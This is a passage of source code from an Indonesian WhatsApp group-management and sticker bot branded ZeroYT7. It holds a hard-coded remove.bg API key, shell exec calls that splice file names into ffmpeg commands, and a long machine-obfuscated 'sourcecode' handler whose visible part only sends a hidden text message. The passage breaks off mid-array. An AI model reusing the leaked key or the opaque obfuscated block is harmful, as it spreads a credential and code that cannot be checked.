if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply("Bot Bukan Admin :)")
if (!isAntiVirtex) return reply('Mode anti virtex sudah nonaktif sebelumnya')
_antivirtex.splice(from, 1)
fs.writeFileSync('./database/antivirtex.json', JSON.stringify(_antivirtex))
reply(`\`\`\`✓Sukes menonaktifkan mode anti virtex di group\`\`\` *${groupMetadata.subject}*`)
break
case 'group' :
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isGroup) return reply(mess.only.group)
if (!isBotGroupAdmins) return reply("Bot Bukan Admin :)")
but = [
{ buttonId: '!groupbuka', buttonText: { displayText: '☰ BUKA' }, type: 1 },
{ buttonId: '!geouptutup', buttonText: { displayText: '☰ TUTUP' }, type: 1 }
]
sendButton(from, "Silahkan pilih untuk buka/tutup group", faketeks, but, mek)
break
case 'groupbuka' :
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply("Bot Bukan Admin :)")
reply(`\`\`\`✓Sukses Membuka Group\`\`\` *${groupMetadata.subject}*`)
zeroyt7.groupSettingChange(from, GroupSettingChange.messageSend, false)
break
case 'grouptutup' :
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply("Bot Bukan Admin :)")
reply(`\`\`\`✓Sukses Menutup Group\`\`\` *${groupMetadata.subject}*`)
zeroyt7.groupSettingChange(from, GroupSettingChange.messageSend, true)
break
case 'linkgrup' :
if (!isGroup) return reply(mess.only.group)
if (!isBotGroupAdmins) return reply("Bot Bukan Admin :)")
linkgc = await zeroyt7.groupInviteCode(from)
yeh = `https://chat.whatsapp.com/${linkgc}\n\nlink Group *${groupName}*`
zeroyt7.sendMessage(from, yeh, text, { quoted: ftrol })
break
case 'promote' :
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply("Bot Bukan Admin :)")
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di jadi admin!')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = 'Perintah di terima, anda menjdi admin :\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)
zeroyt7.groupMakeAdmin(from, mentioned)
} else {
mentions(`Perintah di terima, @${mentioned[0].split('@')[0]} Kamu Menjadi Admin Di Group *${groupMetadata.subject}*`, mentioned, true)
zeroyt7.groupMakeAdmin(from, mentioned)
}
break
case 'demote' :
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply("Bot Bukan Admin :)")
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di tidak jadi admin!')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = 'Perintah di terima, anda tidak menjadi admin :\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)
zeroyt7.groupDemoteAdmin(from, mentioned)
} else {
mentions(`Perintah di terima, Menurunkan : @${mentioned[0].split('@')[0]} Menjadi Member`, mentioned, true)
zeroyt7.groupDemoteAdmin(from, mentioned)
}
break
case 'add' :
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply("Bot Bukan Admin :)")
if (args.length < 1) return reply('Yang mau di add siapa??')
if (args[0].startsWith('08')) return reply('Gunakan kode negara Gan')
try {
num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
zeroyt7.groupAdd(from, [num])
} catch (e) {
console.log('Error :', e)
reply('Gagal menambahkan target, mungkin karena di private')
}
break
case 'kick' :
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply("Bot Bukan Admin :)")
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di tendang!')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = 'Perintah di terima, mengeluarkan :\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)
zeroyt7.groupRemove(from, mentioned)
} else {
mentions(`Perintah di terima, mengeluarkan : @${mentioned[0].split('@')[0]}`, mentioned, true)
zeroyt7.groupRemove(from, mentioned)
}
break
case 'tagall':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
members_id = []
teks = (args.length > 1) ? args.join(' ').trim() : ''
teks += '\n\n'
for (let mem of groupMembers) {
teks += `• @${mem.jid.split('@')[0]}\n`
members_id.push(mem.jid)
}
mentions(teks, members_id, true)
break
case 'setname':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
zeroyt7.groupUpdateSubject(from, `${body.slice(9)}`)
zeroyt7.sendMessage(from, `\`\`\`✓Sukses Mengganti Nama Group Menjadi\`\`\` *${body.slice(9)}*`, text, { quoted: ftrol })
break
case 'setdesc':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
zeroyt7.groupUpdateDescription(from, `${body.slice(9)}`)
zeroyt7.sendMessage(from, `\`\`\`✓Sukses Mengganti Deskripsi Group\`\`\` *${groupMetadata.subject}* Menjadi: *${body.slice(9)}*`, text, { quoted: ftrol })
break
case 'setpp':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
media = await zeroyt7.downloadAndSaveMediaMessage(mek, './database/media_user')
await zeroyt7.updateProfilePicture(from, media)
reply(mess.wait)
reply(`\`\`\`✓Sukses Mengganti Profil Group\`\`\` *${groupMetadata.subject}*`)
break
case 'hidetag':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
var value = body.slice(9)
var group = await zeroyt7.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
text: value,
contextInfo: { mentionedJid: mem },
quoted: ftrol
}
zeroyt7.sendMessage(from, options, text)
break

//━━━━━━━━━━━━━━━[ FITUR STICKER ]━━━━━━━━━━━━━━━━━//

case 'attp':
if (args.length == 0) return reply(`Example: ${prefix + command} Hai`)
buffer = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}`)
zeroyt7.sendMessage(from, buffer, sticker, { quoted: ftrol })
break
case 'sticker':
case 'stiker':
case 's':
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
let media = await zeroyt7.downloadAndSaveMediaMessage(encmedia, './database/media_user')
ran = getRandom('.webp')
await ffmpeg(`./${media}`)
.input(media)
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
reply(mess.error.stick)
})
.on('end', function () {
console.log('Finish')
buffer = fs.readFileSync(ran)
costum(buffer, sticker, Verived, `Jangan Lupa Subscribe Zero YT7`)
fs.unlinkSync(media)
fs.unlinkSync(ran)
})
.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(ran)
} else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
let encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
let media = await zeroyt7.downloadAndSaveMediaMessage(encmedia, './database/media_user')
ran = getRandom('.webp')
reply(mess.wait)
await ffmpeg(`./${media}`)
.inputFormat(media.split('.')[1])
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
tipe = media.endsWith('.mp4') ? 'video' : 'gif'
reply(`❌ Gagal, pada saat mengkonversi ${tipe} ke stiker. pastikan untuk video yang dikirim tidak lebih dari 9 detik`)
})
.on('end', function () {
console.log('Finish')
costum(fs.readFileSync(ran), sticker, Verived, `~ Nih Dah Jadi Gif Stikernya`)
fs.unlinkSync(media)
fs.unlinkSync(ran)
})
.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(ran)
} else if ((isMedia || isQuotedImage) && args[0] == 'nobg') {
let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
let media = await zeroyt7.downloadAndSaveMediaMessage(encmedia, './database/media_user')
ranw = getRandom('.webp')
ranp = getRandom('.png')
reply(mess.wait)
keyrmbg = 'bcAvZyjYAjKkp1cmK8ZgQvWH'
await removeBackgroundFromImageFile({ path: media, apiKey: keyrmbg, size: 'auto', type: 'auto', ranp }).then(res => {
fs.unlinkSync(media)
let buffer = Buffer.from(res.base64img, 'base64')
fs.writeFileSync(ranp, buffer, (err) => {
if (err) return reply('Gagal, Terjadi kesalahan, silahkan coba beberapa saat lagi.')
})
exec(`ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${ranw}`, (err) => {
fs.unlinkSync(ranp)
if (err) return reply(mess.error.stick)
zeroyt7.sendMessage(from, fs.readFileSync(ranw), sticker, { quoted: ftrol })
fs.unlinkSync(ranw)
})
})
} else {
reply(`Kirim gambar dengan caption ${prefix}sticker atau tag gambar yang sudah dikirim`)
}
break
case 'toimg':
if (!isQuotedSticker) return reply(' reply stickernya gan')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
media = await zeroyt7.downloadAndSaveMediaMessage(encmedia, './database/media_user')
ran = getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return reply(' Gagal, pada saat mengkonversi sticker ke gambar ')
buffer = fs.readFileSync(ran)
costum(buffer, image, Verived, `Jangan Lupa Subscribe Zero YT7`)
fs.unlinkSync(ran)
})
break
case 'tomp3':
zeroyt7.updatePresence(from, Presence.recording)
if (!isQuotedVideo) return reply('Reply Video nya Tod')
reply(mess.wait)
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
media = await zeroyt7.downloadAndSaveMediaMessage(encmedia, './database/media_user')
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return reply('Gagal, pada saat mengkonversi video ke mp3')
bufferlkj = fs.readFileSync(ran)
zeroyt7.sendMessage(from, bufferlkj, audio, { mimetype: 'audio/mp4', quoted: ftrol })
fs.unlinkSync(ran)
})
break
case 'tovideo':
if (!isQuotedSticker) return reply('Reply stikernya')
reply(mess.wait)
anumedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
anum = await zeroyt7.downloadAndSaveMediaMessage(anumedia, './database/media_user')
ran = getRandom('.webp')
exec(`ffmpeg -i ${anum} ${ran}`, (err) => {
fs.unlinkSync(anum)
buffer = fs.readFileSync(ran)
zeroyt7.sendMessage(from, buffer, video, { quoted: ftrol, caption: 'Done... Jangan Lupa Subscribe Zero YT7' })
fs.unlinkSync(ran)
})
break

//━━━━━━━━━━━━━━━[ FITUR OWNER ]━━━━━━━━━━━━━━━━━//

case 'owner':
let inilist = []
for (let i of ownerNumber) {
let vname = zeroyt7.contacts[i] != undefined ? zeroyt7.contacts[i].vname || zeroyt7.contacts[i].notify : undefined
inilist.push({
"displayName": 'ZeroYT7',
"vcard": 'BEGIN:VCARD\n'
+ 'VERSION:3.0\n'
+ `FN:${ownername}\n`
+ `ORG: Creator ${ownername} ;\n`
+ `TEL;type=CELL;type=VOICE;waid=${owner}:${owner}\n`
+ 'END:VCARD'.trim()
})
}
hehe = await zeroyt7.sendMessage(from, {
"displayName": `${inilist.length} kontak`,
"contacts": inilist 
}, 'contactsArrayMessage', { quoted: ftrol })
button = [
  {buttonId: '.youtube', buttonText: {displayText: '☰ YOUTUBE'}, type: 1},
  {buttonId: '.instagram', buttonText: {displayText: '☰ INSTAGRAM'}, type: 1},
  {buttonId: '.tiktok', buttonText: {displayText: '☰ TIKTOK'}, type: 1}
]
 buttons = {
    contentText: 'Nih Nomer Owner Ku Mau Tau Tentang Apa Ya ?',
    footerText: faketeks,
    buttons: button,
    headerType: 1
}
await zeroyt7.sendMessage(from, buttons, MessageType.buttonsMessage, {quoted: ftrol})
break
case 'bc':
if (!isOwner) return reply('LU BUKAN OWNER GBLOK')
if (args.length < 1) return reply('Teksnya?')
anu = await zeroyt7.chats.all()
for (let _ of anu) {
buttonss = [{buttonId: `${prefix}menu`, buttonText: {displayText: '☰ MENU'}, type: 1},{buttonId: `${prefix}sewabot`, buttonText: {displayText: '☰ SEWA BOT'}, type: 1}]
const btnbc = {
contentText: `${q}`,
footerText: '*SILAHKAN TEKAN BUTTON UNTUK INFORMASI LANJUT*',
buttons: buttonss,
headerType: 1
}
await zeroyt7.sendMessage(_.jid, btnbc, MessageType.buttonsMessage, {quoted: ftrol})
}
reply(`Sukses mengirim Broadcast:\n${q}`)
break
case 'report':
let pesan = body.slice(8)
if (pesan.length > 300) return pras.sendMessage(from, 'Maaf Teks Terlalu Panjang, Maksimal 300 Teks', text, { quoted: ftrol })
var nomor = mek.participant
let teks1 = `*[REPORT]*\nNomor : @${nomor.split("@s.whatsapp.net")[0]}\nPesan : ${pesan}`
var options = {
text: teks1,
contextInfo: { mentionedJid: [nomor] },
}
zeroyt7.sendMessage(`6285157740529@s.whatsapp.net`, options, text, { quoted: ftrol })
reply('Masalah Telah Di Laporkan Ke Owner BOT, Mohon Tunggu Untuk Proses Perbaikan')
break
case 'youtube':
teks =
`Nih Youtube Owner Ku Jangan Lupa Di Subscribe Ya https://youtube.com/ZeroYT7`
zeroyt7.sendMessage(from, teks, text, {quoted: ftrol})
break
case 'instagram':
teks =
`Nih Instagram Owner Ku Jangan Lupa Di Follow Ya https://instagram.com/Zero_YT7`
zeroyt7.sendMessage(from, teks, text, {quoted: ftrol})
break
case 'tiktok':
teks =
`Nih Tiktok Owner Ku Jangan Lupa Di Follow Ya https://tiktok.com/@_zeroyt7`
zeroyt7.sendMessage(from, teks, text, {quoted: ftrol})
break
case 'sourcecode':
case 'script':
case 'sc':
(function(_0xeea076,_0x28f3ca){function _0x43caf9(_0x16106c,_0x209b3f,_0x32b29f,_0x2efdf3,_0x5612fc){return _0x5e48(_0x32b29f- -0x14a,_0x2efdf3);}function _0x5cf514(_0x4c66bd,_0x4a4fdf,_0x5b05c5,_0x2ce2c9,_0x2e0c33){return _0x5e48(_0x4a4fdf-0x120,_0x4c66bd);}function _0xe85662(_0x50d582,_0x11dbe6,_0x3cd3e8,_0xb32f04,_0x1aa64d){return _0x5e48(_0x3cd3e8- -0x216,_0x11dbe6);}function _0x4814e7(_0x37f526,_0x11aebf,_0x1e49b9,_0x27e372,_0x37b47c){return _0x5e48(_0x1e49b9- -0xda,_0x37b47c);}function _0x25388c(_0x2d5187,_0x2973b1,_0x57489f,_0x3e2cc8,_0x4569e5){return _0x5e48(_0x2d5187-0x164,_0x4569e5);}var _0x36c56e=_0xeea076();while(!![]){try{var _0x484f37=parseInt(_0x25388c(0x3b5,0x47a,0x485,0x303,'8%29'))/(-0x15bb+-0xb1d+0x1*0x20d9)*(-parseInt(_0x25388c(0x280,0x18e,0x268,0x2af,'*Opm'))/(0x731*0x3+-0x433+0x2e5*-0x6))+parseInt(_0x4814e7(0x2a,-0xe5,-0xb,0xea,'MUp7'))/(0x209+-0x2*-0x623+-0xa*0x16e)*(parseInt(_0x4814e7(0x182,0x178,0x105,0x18a,'YDrV'))/(-0x1*-0x1c9b+-0x1*0x158f+-0x708))+-parseInt(_0x43caf9(-0xcb,-0xd7,-0xd2,'ZVi2',-0x121))/(-0xca*-0x26+-0x59+0x11*-0x1be)*(-parseInt(_0x43caf9(0x1ef,0x5a,0xf0,'wj^F',0xad))/(-0x1cd*0x11+0x1d2d+-0xb*-0x22))+-parseInt(_0x43caf9(0x7c,-0x12,0x67,'pQ5H',0x176))/(-0x9c8*0x3+0x2b*-0x2f+0x5a*0x6a)*(-parseInt(_0x4814e7(0xdd,0x10c,0xa5,0x126,'CyUh'))/(-0xfb8+-0x1d46+0x2d06))+-parseInt(_0x43caf9(0xa0,0xe7,0x77,']h48',0x147))/(0x9c*0x1d+-0x1*0x2622+0x1dd*0xb)*(-parseInt(_0xe85662(-0x19b,'[nAp',-0xb6,-0xa9,-0x29))/(-0x1*-0x17bf+0x1735*0x1+-0x2*0x1775))+-parseInt(_0x25388c(0x234,0x1b3,0x1bc,0x1fb,'y6Ys'))/(0x36b*-0xb+0x1*-0x31f+0x28c3*0x1)+parseInt(_0x25388c(0x23c,0x2e7,0x307,0x1e4,'^Ya0'))/(0xbbc+0x1c90+0x4*-0xa10);if(_0x484f37===_0x28f3ca)break;else _0x36c56e['push'](_0x36c56e['shift']());}catch(_0x4d6280){_0x36c56e['push'](_0x36c56e['shift']());}}}(_0x5121,0x15861f+-0x143f2a+0xb62a9),teks=_0x3d0792(-0x39c,-0x389,-0x3ac,-0x2e6,'W%H[')+_0x3d0792(-0x1e4,-0x283,-0x36f,-0x26b,'cjbI')+_0x5e5de5(0x4fb,'Xx1!',0x4b1,0x545,0x5a7)+_0x3a5a68(-0x22f,-0x1e0,'Xcie',-0xd3,-0x1da)+_0x5e5de5(0x52f,'huxa',0x485,0x3f2,0x3e3)+_0x3a5a68(-0x25a,-0x26e,'dcS@',-0x87,-0x183)+_0x3a5a68(-0x154,-0x13c,'EEvd',-0x16e,-0x141)+_0x377caa(0x172,0xfd,'&ixT',0x1f5,0x17f)+_0x377caa(0xd7,0x17f,'^Ya0',0x1e7,0x1e4)+_0x377caa(0x240,0x23b,'aCbI',0x2bf,0x295)+_0x5e5de5(0x277,'b^SM',0x353,0x3b8,0x392)+_0x377caa(0xbe,0x1e6,'0Xq(',0x8c,0x107)+_0x5e5de5(0x4a1,'b^SM',0x53f,0x42f,0x4bb)+_0x3d0792(-0xa9,-0x18,-0x13b,-0xde,'%[n2')+_0x3d0792(-0x1c3,-0x372,-0x28b,-0x2bd,'%[n2')+_0x5e5de5(0x4da,'cjbI',0x523,0x548,0x44f)+_0x3a5a68(-0x364,-0x406,'MUp7',-0x35b,-0x330)+_0x3a5a68(-0x190,-0x25c,'ir#*',-0x1fe,-0x230)+_0x3a5a68(-0x1f9,-0x25f,'z7eL',-0x271,-0x187)+_0x377caa(0x7e,0x136,'sP1(',0x1ba,0x134)+_0x5e5de5(0x3da,'E2X&',0x477,0x536,0x3e8)+_0x377caa(0x1f8,0x2cf,'MUp7',0x1b7,0x1e1)+_0x5e5de5(0x317,'2krx',0x37e,0x483,0x40c)+_0x5d9a8b(0x250,0x3bb,0x204,'1[)J',0x2c9)+_0x3a5a68(-0x25f,-0xae,'Ac1K',-0x17e,-0x1b7)+_0x377caa(0x27e,0x241,'Xx1!',0x278,0x20b)+_0x3d0792(-0x14e,-0xa5,-0x69,-0x15b,'wW7^')+_0x377caa(0x2b8,0x346,'YONU',0x2c6,0x2e9)+_0x3d0792(-0x205,-0x21a,-0xe6,-0x152,'q0t1')+_0x5e5de5(0x43c,'y6Ys',0x3d9,0x3aa,0x450)+_0x3d0792(-0x14f,-0x1d9,-0x5a,-0x10c,'z7eL')+_0x3d0792(-0x11f,-0x1c1,-0x15e,-0x20f,'ZVi2')+_0x377caa(0x13b,0x2e2,'vhx$',0x169,0x22a)+_0x3a5a68(-0x355,-0x2e1,'cjbI',-0x394,-0x322)+_0x3d0792(-0x144,-0x18f,-0x12f,-0x1c3,']h48')+_0x5e5de5(0x417,'y6Ys',0x4da,0x4ff,0x568)+_0x3a5a68(-0x384,-0x258,'cSL]',-0x22a,-0x2c7)+_0x3d0792(-0x186,-0x239,-0x2f8,-0x20c,'kBcZ')+_0x5e5de5(0x4d6,'MUp7',0x4b7,0x469,0x4ac)+_0x5d9a8b(0x3cc,0x3ce,0x425,'aCbI',0x37c)+_0x3d0792(-0x2d7,-0x356,-0x200,-0x266,'I))K')+_0x377caa(0xeb,0x161,'ZVi2',0xed,0x19c)+_0x377caa(0x260,0x210,'2krx',0x2d9,0x202)+_0x3d0792(-0x200,-0x1df,-0x391,-0x2c6,'q]gJ')+_0x5d9a8b(0x320,0x3f3,0x45d,'q]gJ',0x3c4)+_0x5e5de5(0x594,'SBUC',0x4c1,0x569,0x471)+_0x377caa(0x2c3,0x236,'EEvd',0xe2,0x1ec)+_0x3d0792(-0x20e,-0x15c,-0x123,-0x164,'YONU')+_0x377caa(0x7e,0x180,'[nAp',0x86,0x135)+_0x377caa(0x287,0x1a0,'CyUh',0x276,0x18a));var _0x60ebed={};_0x60ebed[_0x3a5a68(-0x281,-0x25e,'Ac1K',-0x134,-0x1bc)+'d']=ftrol,zeroyt7[_0x5d9a8b(0x36a,0x40e,0x4f9,'YONU',0x42d)+_0x377caa(0x262,0x211,'2krx',0x20f,0x194)+'e'](from,teks,text,_0x60ebed);function _0x377caa(_0x28a581,_0x965fd1,_0x386934,_0x31eb51,_0x18ab27){return _0x5e48(_0x18ab27-0x88,_0x386934);}function _0x5121(){var _0x580625=['WQZdI8oaW4zu','WOr0WOeXWR0','oCkwWRxdTSkF','kCovW57dUri','WRtcNmkblSo5','tGBcMW','WPKSECowWO8','nSoGuCkNiW','WONdGsLOW4e','WRa7WRDyeq','iSksWPuvF8k8W6/dUYJdLhG','B0/dJJ99','E3VdLCoJW68','W7/dLCkKhmoA','nuJdJg/dOa','W4FdNudcJvi','of3cL3BdIa','D2yk','bqTvWQby','p0pdJtBdOq','W5ZcHSkrpmkxW5RdRCkppItdVmoI','WOixx8o5WRi','sSojW6NdTSog','aazoW5FcOq','FwCdWONdJa','WRP3WP7dKCoh','rIZcISo/uq','ymkQA8kLW6a','WR/cKrxcGWW','fCkcW7aoW6u','FwKbWPy','pSoZW5ZdUHC','WP/dQvaCWQW','WP05qCoWWQK','o8kkWPpcIWq','WRmhwmo2WQm','c8owt8kX','ESkzx8o9eG','bCkrsqldVG','F3GDWPBdGq','baJcISoQWQG','q2BdUG','FCk0ECoInG','W4VdO8kMdCo3','W4vlC8oQWQNcHmk1WRW','EK3dNZbH','WQxcJSoHxSkh','E0FcHW8r','Eg4KC0W','aCk8g2hcRG','p8ohsCoyEG','WPflWQ3dGmo9','WO7cT8okWOOf','W5xdSbxcSb4','W7WkW59Y','vSo0W4FcJG','WQ/dPCo5W4DS','iGRcO8k3','WP5SWQVdUZ8','WPldTCkmxSo6','W5xdNmk/n8oK','W4uslXBcVW','hmkYWPhcRaS','WQxdSLaCWPO','4Pw64PEK4PEq4PAx4PER','WRNcKblcQqi','qXtdJSo3W6O','WPRcLmoJzCow','WPbSWRuvWOi','v8ooW5XXmq','wCkAy8kMW7G','WRb5BokvMSo+','Egmvw1u','WPNdKmoBvCo2','4PEX4Pw+4Psq4PAs4PEO','rCkdsSk4W7m','xmoWW411ma','vxaPBeO','e13dHmk+WOVdHSkLpdtcOmo/W6u','DuxcHaX/','W7KkW6vrCa','uexcPKxdOW','4PAf4PEa4Pwn4PAP4PAN','W6NdGbNcIbe','sbRcLmo2DG','mSovW5RdVcy','s2uOE2C','osjFWQDi','F1/cJre','uJ3cMCoOxa','jaPJW5RcVG','xwBcVCoPW5m','pHNdG1b8','amoruCkGoa','W4VcItdcPG','WRtcGsxcIaK','utBcRCoUDW','WOFdHmoyhSkk','zJJcSmobW6O','WOurq8oMWPO','zSolW61taG','WPddQ8oRh8k6','WQ3cPcRcSWK','WRnuWQBdQCot','WQtdNCkuW5f4','yfNcOX0Y','W4epeXBcOG','uYdcQ8oRzG','WQ5PWR3dJq','WOJdT8owWR7cVSohBrxcOSoTimoc','WOxdGSooy8oO','mSkuArJdIq','cSkvWORcMs8','zCkaDWSW','d8kOWOFdH8ki','WRH3WO4ZWRO','W5ajomkopa','WQhcVaJcUYe','W5JdVINcTIW','WOCHcdxcQG','kSk4kLtcKW','zvtcIGW0','imkkWRtdS8kP','WRlcKZVcTaC','W4Ose8k7hq','W77dJaxdUCo5','fd9RWR0','W4NcGWhdJ8os','mSkRW4mCW5S','W44GW4rWFa','WOVcVCoTWQCW','WRCHWRfagW','x3BcPHmL','EgKRAvy','W4iaW6XBqG','W4xdKKRcNd/cKmo+uSkG','WRxcKcFcKty','WRBdSx7cNCksoCo3W6JcGIGmWQO','rSojW7VcVCka','nfWGAe0','4PA04PAP4PsH4PE54Ps3','WO/dNgOBWRC','WOtdVCoGrCo1','DL7dJa13','4PwP4PA/4PsH4PEv4Pwm','d3ldIupdUW','WORdSmoPC8oT','dmo2uCkKjq','tMRdQCozW6G','m8klW5qEW4u','W6JdIIxcOrm','W4WTW6nLBG','WRr7WQxdM8oZ','qmoYW7BcTq','WOGRcchcQG','WQlcKIJcTJC','W7BcHb/dSCoX','kmkPWPJdTSkX','W7tdUmovlCkDWOFcRW','WQ3cGvBcKcNdNSk2t8k/','qwlcIWfd','d17dSSocW6S','WR82WPJcGmkr','WPVcHrO','j8ksWPqsFCoUW47dStpdLxJcOa','W77dGmk8amoC','fCkwWQ7cIc4','omk1W4CfW60','pmozbmk9sGT8W70+jM4v','zqhcPmoTW5u','WPq3ymoJWOe','W4utW41VEa','WOBdICo3W6rq','zrlcPSoMW6u','uSkjtSoMja','WOdcNelcGxyuWQPK','WPJcO8k9WR8H','WOpdHZvsW54','CutcKxZdTa','sHNdI1ql','iSkpzG0','CSkvDmkOW70','zLhdUSoPW6S','W4pcLYNcVSkG','W6CoW4n7BG','a8o7W7NdLGS','WQKNWQHzcG','imoXE8kgdW','W6aAWRDzda','qCoZW7NcUmkd','sMpdQ8ohW4q','W7K+nmkRkW','hmkIDq3dLa','lCkQW6qDW6y','bddcI8odWPG','pqZcGCohWQK','gZz6W5VcGW','BLNcIdmY','W5ydW6PXCG','qGBcJ8oHW6y','uuD5CIa','W7/dGmkPb8on','WQNdMCo1p8ku','BMmpt3G','F1/cJa','u8k0jK3cKmkCW5i','uCovW41pjG','j8olwSoSyq','WPCFWOfJgq','WRD8WPxdH8o8','WPddGIzkW4G','wLTTrq','duBdLLNdLW','W5RcSZBcLCki','p0NdGxpdIa','fSkUWPpcMJC','WQtcPCoSWRi/','Cc7dSCoNW6W','zmoVW4bNaW','aSkPd0lcJW','WOPZsCopDc90hmkMarldULO','smkaBSkHW6m','vr3cN8o+W5m','oCkXEJNdLG','WOpcHs7cIr0','tmo6W7pcSmkd','a8kgBrSf','tGBdO8o6W7C','W6yNW6jQFq','p8kVcNxcRW','WOVdMsi','W7RcMComW7zPW4WdW5a','imkgzbG1','WPTyWOe0WRu','jmkKggZcPG','4PwO4Pwt4Psu4PA/4PEo','hwNdIuhdSW','W6FcSdhcT8kS','WOfUw2BcHa','cx5UW77dOW','WQGDkYRcKW','kmk/d1tcJG','tSoCW4NcS8kS','nCkgWRRdSSki','Dw3cPSkXW70','W43dNdhcQq8','zCk6y8kRW7i','oCoKEColwa','F8kk4Psx4PAA4Psl','swHTxZS','WRajdXlcLa','4PwA4PsX4PAI4Psw4PA4','xwtdTCo8W7y','tSoby8k9W7O','sIRcUSolW48','WP3dHNabWQy','WRboWQddR8of','WPebkXFcJW','W5lcJrdcP8ks','zq7cRmo7W5u','WPJdHM1vW74','WQ7cMmoPWROZ','bSkda0/cQa','yg/cM2JdGG','W7FcVSkjW57dPW','WPJdN8owW5nT','WRyEWPf+na','WOJcH8orWQCC','sCkVtmoHgG','p1TVmW','W7W8e8kOiq','uCo5W49XaG','W6hcIIRdNSok','4PsxdEkxRItdPa','wCojW4jWdG','WR9zWRBdJti','W6RcTCkjW53dPG','WRufWO98hq','ySoyW5rd','W7tcRbRcUSkX','DxhdPXjG','W44tW49iDG','wx/cOXyh','W7KEW45ODq','uhCHWQGY','WRpdMSoNe8k9','WOjmWQddImoE','W6VdNblcHq','CbNcNsZdOW','s8khzmo8gW','vSo+W6VcPq','WOVdMMO+WQu','emkOWOVcUG','dmkwaCkUmq','WRLcW6ddTSoQ','s3VdV8oZW54','W4pdMe3dHv3dKSooDSkliCobeq','imobiWq9','kCoWC8o2CG','bCoMW5tdTt0','cZX6W4ZcOq','W6CIW6XDsG','yIBdSCoUW4C','fgfOWO/cSG','W4dcQHZdNSoI','W6RdOdFcMc8','d8okt8k2oa','kSkexq7dSa','W6ZdKmozBmo0','qGxcQSojza','jHD2WR1h','aWvLW5xcVG','mmkGBHtdGG','lh/cTSkKW58','kSoPBCo+','WO/dNhegWRC','gIz3W4VcOq','WO/